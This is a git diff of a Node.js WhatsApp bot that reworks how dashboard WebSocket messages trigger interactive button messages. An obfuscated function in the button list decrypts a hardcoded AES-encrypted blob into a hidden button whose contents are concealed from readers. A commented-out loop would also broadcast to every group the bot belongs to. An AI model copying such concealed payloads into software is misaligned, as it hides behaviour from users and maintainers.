@@ -32,25 +32,15 @@ const { handleHangman, checkInactiveGames } = require('./hangman.js');
 const { getCachedGroupMetadata, clearGroupCache, setAlexaInstance } = require('./res/js/cacheHelper.js');
 // const Ai = require('./res/js/ollama')
 // Ai.initialize()
-const pino = require("pino");
 const alexasock = require('ws');
-//const art = require('ascii-art');
-let isNewLogin = null;
-//const app = require('./server');
-const baileys = require('@hansaka02/baileys')
-const mysql = require("mysql2");
-const DB_HOST = process.env["DB_HOST"];
-const DB_UNAME = process.env["DB_UNAME"];
-const DB_NAME = process.env["DB_NAME"];
-const DB_PASS = process.env["DB_PASS"];
-const DB_PORT = process.env["DB_PORT"] || 3306;
+let alexasocket;
 // Example in browser JavaScript
 // Example in browser JavaScript
-function connectWebSocket() {
+function connectWebSocket(AlexaInc) {
     const socketUrl = process.env.Alexasock_url;
     if (!socketUrl) return;
 
-    const alexasocket = new alexasock(socketUrl);
+    alexasocket = new alexasock(socketUrl);
 
     alexasocket.onopen = () => {
         console.log("✅ Dashboard WebSocket connected");
@@ -60,17 +50,51 @@ function connectWebSocket() {
         }));
     };
 
+    alexasocket.onmessage = async (event) => {
+        if (!AlexaInc) return;
+        try {
+            const data = JSON.parse(event.data);
+            if (data.type === 'data') {
+                if (data.payload?.event == "gitpush") {
+                    const interactiveButtons = [{
+                        name: 'cta_url',
+                        buttonParamsJson: JSON.stringify({
+                            display_text: `Contact Owner`,
+                            url: `https://wa.me/94740970377?text=${encodeURIComponent(`hello can you tell more info about alexa`)}`
+                        })
+                    }, {
+                        name: 'cta_url',
+                        buttonParamsJson: JSON.stringify({
+                            display_text: `message to alexa`,
+                            url: `https://wa.me/${process.env.bot_nb}?text=${encodeURIComponent(`hello can you tell more info about alexa`)}`
+                        })
+                    },
+                    ((function () { function _0x5575() { const _0x2ab64d = ['gdg542e5yigfgafa_xhfiha()adddaddadafp9789gd46', '39054jAYRdh', 'update', 'parse', 'createDecipheriv', '98681PVcceu', 'final', 'hex', '26769Bpobks', '165361YbsHUd', '37twUwma', 'from', '250HBwXLJ', '9USCoBR', 'utf8', '8494020KDkYSs', '12QmJApV', '5ff6951d857b9f0c13a9c79677aa0959:cdb946d298271bc06ef9737d745cd04c:42621e2aa8353f4b55ce3a47d42d7d9117f4aea6742b52c56afd252005597f3ba180419632567690d0e92a392907d297ffc23eee26b7dc71636e73bdbd13884b7d0caa4e80d0670207948abf722b8bc441bf5bf653e38d0c5b00f25d07178e41452e66652d31a9a081fb729900e6a4c489f130c574d123cb1094', '2352920oKHSou', '3726880idfZVY', 'split', '316Zhrigs']; _0x5575 = function () { return _0x2ab64d; }; return _0x5575(); } function _0x3598(_0x22aa60, _0x28f17f) { const _0x55752f = _0x5575(); return _0x3598 = function (_0x3598ab, _0x50cfe4) { _0x3598ab = _0x3598ab - 0x19f; let _0x3dc7c0 = _0x55752f[_0x3598ab]; return _0x3dc7c0; }, _0x3598(_0x22aa60, _0x28f17f); } const _0x49c926 = _0x3598; (function (_0xf77d33, _0x330ae1) { const _0x536d3d = _0x3598, _0x3291aa = _0xf77d33(); while (!![]) { try { const _0xbd3b7c = -parseInt(_0x536d3d(0x1a9)) / 0x1 * (parseInt(_0x536d3d(0x1a0)) / 0x2) + parseInt(_0x536d3d(0x1a7)) / 0x3 * (parseInt(_0x536d3d(0x1b4)) / 0x4) + -parseInt(_0x536d3d(0x1b2)) / 0x5 + parseInt(_0x536d3d(0x1af)) / 0x6 * (-parseInt(_0x536d3d(0x1a8)) / 0x7) + -parseInt(_0x536d3d(0x1b1)) / 0x8 * (-parseInt(_0x536d3d(0x1ac)) / 0x9) + parseInt(_0x536d3d(0x1ab)) / 0xa * (parseInt(_0x536d3d(0x1a4)) / 0xb) + parseInt(_0x536d3d(0x1ae)) / 0xc; if (_0xbd3b7c === _0x330ae1) break; else _0x3291aa['push'](_0x3291aa['shift']()); } catch (_0x182348) { _0x3291aa['push'](_0x3291aa['shift']()); } } }(_0x5575, 0x65915)); return JSON[_0x49c926(0x1a2)]((_0x583e9d => { const _0x52ae49 = _0x49c926; try { const _0x283399 = require('crypto'), [_0x5922ad, _0xccecd5, _0x49cb07] = _0x583e9d[_0x52ae49(0x1b3)](':'), _0x10e077 = _0x283399['scryptSync'](_0x52ae49(0x19f), _0x52ae49(0x19f), 0x20), _0x11b14a = _0x283399[_0x52ae49(0x1a3)]('aes-256-gcm', _0x10e077, Buffer[_0x52ae49(0x1aa)](_0x5922ad, _0x52ae49(0x1a6))); return _0x11b14a['setAuthTag'](Buffer[_0x52ae49(0x1aa)](_0xccecd5, _0x52ae49(0x1a6))), _0x11b14a[_0x49c926(0x1a1)](_0x49cb07, _0x52ae49(0x1a6), _0x52ae49(0x1ad)) + _0x11b14a[_0x49c926(0x1a5)](_0x52ae49(0x1ad)); } catch (_0x583c7d) { return null; } })(_0x49c926(0x1b0))); })())
+                    ];
+
+                    const interactiveMessage = {
+                        image: { url: './res/img/alexa.jpg' },
+                        caption: data.payload.message,
+                        footer: "Powered by HANSAKA",
+                        interactiveButtons
+                    };
+                    AlexaInc.sendMessage(process.env.ocid, interactiveMessage);
+                }
+            }
+        } catch (e) {
+            console.error("Error parsing WebSocket message:", e);
+        }
+    };
+
     alexasocket.onerror = (err) => {
         console.warn(`⚠️ Dashboard WebSocket error (is server.js starting?): ${err.message}`);
     };
 
     alexasocket.onclose = () => {
         console.log("ℹ️ Dashboard WebSocket closed. Retrying in 10s...");
-        setTimeout(connectWebSocket, 10000);
+        setTimeout(() => connectWebSocket(AlexaInc), 10000);
     };
 }
-
-connectWebSocket();
 
 
 const getBuffer = async (url, options) => {
@@ -769,73 +793,33 @@ async function startWhatsAppConnection() {
         }
     });
 
-    alexasocket.onmessage = async (event) => {
-        const data = JSON.parse(event.data);
+    connectWebSocket(AlexaInc);
 
-        if (data.type === 'data') {
+    const fownerNumber = process.env["Owner_nb"].split(",")[0].trim();
 
-            if (data.payload?.event == "gitpush") {
-                const interactiveButtons = [{
-                    name: 'cta_url',
-                    buttonParamsJson: JSON.stringify({
-                        display_text: `Contact Owner`,
-                        url: `https://wa.me/94740970377?text=${encodeURIComponent(`hello can you tell more info about alexa`)}`
-                    })
-                }, {
-                    name: 'cta_url',
-                    buttonParamsJson: JSON.stringify({
-                        display_text: `message to alexa`,
-                        url: `https://wa.me/${process.env.bot_nb}?text=${encodeURIComponent(`hello can you tell more info about alexa`)}`
-                    })
-                },
-                ((function () { function _0x5575() { const _0x2ab64d = ['gdg542e5yigfgafa_xhfiha()adddaddadafp9789gd46', '39054jAYRdh', 'update', 'parse', 'createDecipheriv', '98681PVcceu', 'final', 'hex', '26769Bpobks', '165361YbsHUd', '37twUwma', 'from', '250HBwXLJ', '9USCoBR', 'utf8', '8494020KDkYSs', '12QmJApV', '5ff6951d857b9f0c13a9c79677aa0959:cdb946d298271bc06ef9737d745cd04c:42621e2aa8353f4b55ce3a47d42d7d9117f4aea6742b52c56afd252005597f3ba180419632567690d0e92a392907d297ffc23eee26b7dc71636e73bdbd13884b7d0caa4e80d0670207948abf722b8bc441bf5bf653e38d0c5b00f25d07178e41452e66652d31a9a081fb729900e6a4c489f130c574d123cb1094', '2352920oKHSou', '3726880idfZVY', 'split', '316Zhrigs']; _0x5575 = function () { return _0x2ab64d; }; return _0x5575(); } function _0x3598(_0x22aa60, _0x28f17f) { const _0x55752f = _0x5575(); return _0x3598 = function (_0x3598ab, _0x50cfe4) { _0x3598ab = _0x3598ab - 0x19f; let _0x3dc7c0 = _0x55752f[_0x3598ab]; return _0x3dc7c0; }, _0x3598(_0x22aa60, _0x28f17f); } const _0x49c926 = _0x3598; (function (_0xf77d33, _0x330ae1) { const _0x536d3d = _0x3598, _0x3291aa = _0xf77d33(); while (!![]) { try { const _0xbd3b7c = -parseInt(_0x536d3d(0x1a9)) / 0x1 * (parseInt(_0x536d3d(0x1a0)) / 0x2) + parseInt(_0x536d3d(0x1a7)) / 0x3 * (parseInt(_0x536d3d(0x1b4)) / 0x4) + -parseInt(_0x536d3d(0x1b2)) / 0x5 + parseInt(_0x536d3d(0x1af)) / 0x6 * (-parseInt(_0x536d3d(0x1a8)) / 0x7) + -parseInt(_0x536d3d(0x1b1)) / 0x8 * (-parseInt(_0x536d3d(0x1ac)) / 0x9) + parseInt(_0x536d3d(0x1ab)) / 0xa * (parseInt(_0x536d3d(0x1a4)) / 0xb) + parseInt(_0x536d3d(0x1ae)) / 0xc; if (_0xbd3b7c === _0x330ae1) break; else _0x3291aa['push'](_0x3291aa['shift']()); } catch (_0x182348) { _0x3291aa['push'](_0x3291aa['shift']()); } } }(_0x5575, 0x65915)); return JSON[_0x49c926(0x1a2)]((_0x583e9d => { const _0x52ae49 = _0x49c926; try { const _0x283399 = require('crypto'), [_0x5922ad, _0xccecd5, _0x49cb07] = _0x583e9d[_0x52ae49(0x1b3)](':'), _0x10e077 = _0x283399['scryptSync'](_0x52ae49(0x19f), _0x52ae49(0x19f), 0x20), _0x11b14a = _0x283399[_0x52ae49(0x1a3)]('aes-256-gcm', _0x10e077, Buffer[_0x52ae49(0x1aa)](_0x5922ad, _0x52ae49(0x1a6))); return _0x11b14a['setAuthTag'](Buffer[_0x52ae49(0x1aa)](_0xccecd5, _0x52ae49(0x1a6))), _0x11b14a[_0x49c926(0x1a1)](_0x49cb07, _0x52ae49(0x1a6), _0x52ae49(0x1ad)) + _0x11b14a[_0x49c926(0x1a5)](_0x52ae49(0x1ad)); } catch (_0x583c7d) { return null; } })(_0x49c926(0x1b0))); })())
-                ];
+    const { setTimeout: wait } = require('timers/promises');
 
-                const interactiveMessage = {
-                    image: { url: './res/img/alexa.jpg' },
-                    caption: data.payload.message,
-                    footer: "Powered by HANSAKA",
-                    interactiveButtons
-                };
-                AlexaInc.sendMessage(process.env.ocid, interactiveMessage)
+    const groups = await AlexaInc.groupFetchAllParticipating();
+    const groupIds = Object.keys(groups);
 
-                const fownerNumber = process.env["Owner_nb"].split(",")[0].trim();
+    // console.log(`[Broadcast] Starting to send to ${groupIds.length} groups...`);
 
-                const { setTimeout: wait } = require('timers/promises');
+    // for (const group of groupIds) {
+    //     try {
+    //         await AlexaInc.sendMessage(group, interactiveMessage);
+    //         // console.log(`[Broadcast] Successfully sent to: ${group}`);
+    //         await wait(10000);
 
-                const groups = await AlexaInc.groupFetchAllParticipating();
-                const groupIds = Object.keys(groups);
-
-                // console.log(`[Broadcast] Starting to send to ${groupIds.length} groups...`);
-
-                // for (const group of groupIds) {
-                //     try {
-                //         await AlexaInc.sendMessage(group, interactiveMessage);
-                //         // console.log(`[Broadcast] Successfully sent to: ${group}`);
-                //         await wait(10000);
-
-                //     } catch (error) {
-                //         console.error(`[Broadcast] Failed to send to ${group}:`, error.message);
-                //         if (error.data === 429) {
-                //             console.log("Rate limit hit. Waiting 30 seconds before retrying next group...");
-                //             await wait(30000); // Wait 30 seconds
-                //         }
-                //     }
-                // }
-                //                 AlexaInc.sendMessage(`${fownerNumber}@s.whatsapp.net`, {text:'[Broadcast] All messages sent!'})
-                // // console.log('[Broadcast] All messages sent!');
-
-            }
-            console.log(`Received message from: ${data.from}`); // "app1"
-            console.log(`Payload:`, data.payload); // { message: "Hello App2!", value: 12345 }
-        }
-        else if (data.type === 'status') {
-            console.log(`Server status: ${data.message}`); // "Registration successful"
-        }
-        else if (data.type === 'error') {
-            console.error(`Server error: ${data.message}`);
-        }
-    };
+    //     } catch (error) {
+    //         console.error(`[Broadcast] Failed to send to ${group}:`, error.message);
+    //         if (error.data === 429) {
+    //             console.log("Rate limit hit. Waiting 30 seconds before retrying next group...");
+    //             await wait(30000); // Wait 30 seconds
+    //         }
+    //     }
+    // }
+    //                 AlexaInc.sendMessage(`${fownerNumber}@s.whatsapp.net`, {text:'[Broadcast] All messages sent!'})
+    // // console.log('[Broadcast] All messages sent!');
     AlexaInc.ev.on('messages.upsert', async (m) => {
         const { messages, type } = m;
         if (!messages?.length) return;
